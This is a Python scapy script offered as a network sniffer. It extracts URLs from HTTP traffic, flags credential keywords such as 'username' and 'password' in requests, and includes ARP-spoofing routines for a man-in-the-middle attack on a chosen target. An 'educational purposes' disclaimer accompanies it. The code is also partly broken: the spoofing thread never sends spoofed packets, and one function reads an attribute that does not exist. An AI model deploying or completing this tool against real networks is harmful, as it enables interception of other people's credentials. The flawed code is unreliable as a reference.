#!/usr/bin/env python3
import argparse, time, threading
import scapy.all as scapy
from scapy.layers import http

global spoofed

def main():
    ecouteReseau()

def ecouteReseau():
    scapy.sniff(iface=args.iface, filter=args.filter, count=args.count, prn=analysePaquet, store=args.save)

def analysePaquet(paquet):
    if paquet.haslayer(http.HTTPRequest) and paquet[http.HTTPRequest].haslayer(http.HTTPRequest):
        extractUrl(paquet)
        extractIds(paquet)

def extractUrl(paquet):
    url = paquet[http.HTTPRequest].Host.decode() + paquet[http.HTTPRequest].Path.decode()
    print(f"URL extracted: {url}", url)

# You should change this list to something bigger
keywords_to_search = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def extractIds(paquet):
    if paquet[http.HTTPRequest].haslayer(scapy.Raw):
        body = paquet[http.HTTPRequest].Raw.load.decode(errors="ignore")
        for keyword in keywords_to_search:
            if keyword in body:
                print(f"Keyword '{keyword}' found in the request body.")

    params = paquet[http.HTTPRequest].http_request
    for keyword in keywords_to_search:
        if keyword in params:
            print(f"Keyword '{keyword}' found in the request parameters.")
    
def arpSpoofing():
    paquet_gtw_to_target = scapy.ARP(op=2, pdst=args.target, hwdst=getMac(args.target), psrc=args.mitm)
    paquet_target_to_gtw = scapy.ARP(op=2, pdst=args.mitm, hwdst=getMac(args.mitm), psrc=args.target)
    scapy.send(paquet_gtw_to_target, verbose=args.verbose)
    scapy.send(paquet_target_to_gtw, verbose=args.verbose)

def getMac(ip):
    arp_who_has = scapy.ARP(pdst = ip)
    broadcast_l2 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast_l2 / arp_who_has
    answered_list = scapy.srp(request, timeout=args.timeout, verbose=args.verbose)[0]
    return answered_list[0][1].hwsrc

def cleanSpoof():
    hwdst = getMac(args.target)
    hwsrc = getMac(args.mitm)
    paquet1 = scapy.ARP(op=2, pdst=args.target, psrc=args.mitm, hwdst=hwdst, hwsrc=hwsrc)
    paquet2 = scapy.ARP(op=2, pdst=args.mitm, psrc=args.target, hwdst=hwsrc, hwsrc=hwdst)
    scapy.send(paquet1, verbose=args.verbose)
    scapy.send(paquet2, verbose=args.verbose)


def spoof():
    try:
        while True:
            print("Spoofing...")
            time.sleep(1)
    except Exception as e:
        print(f"Error in spoof: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Sniffer Python",
        description="Sniff the network",
        epilog="Do not use this program for malicious activity it's written only for educational purposes."
    )
    parser.add_argument("-f", "--filter")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-c", "--count")
    parser.add_argument("-s", "--save", action="store_true")

    parser.add_argument("--mitm")
    parser.add_argument("-t", "--target")
    parser.add_argument("--timeout", default=5)

    args = parser.parse_args()

    if args.mitm:
        spoof_thread = threading.Thread(target=spoof)
        try:
            spoof_thread.start()
            main()
        except Exception as e:
            print(f"{e}")
            spoof_thread.join()
        finally:
            cleanSpoof()

    main()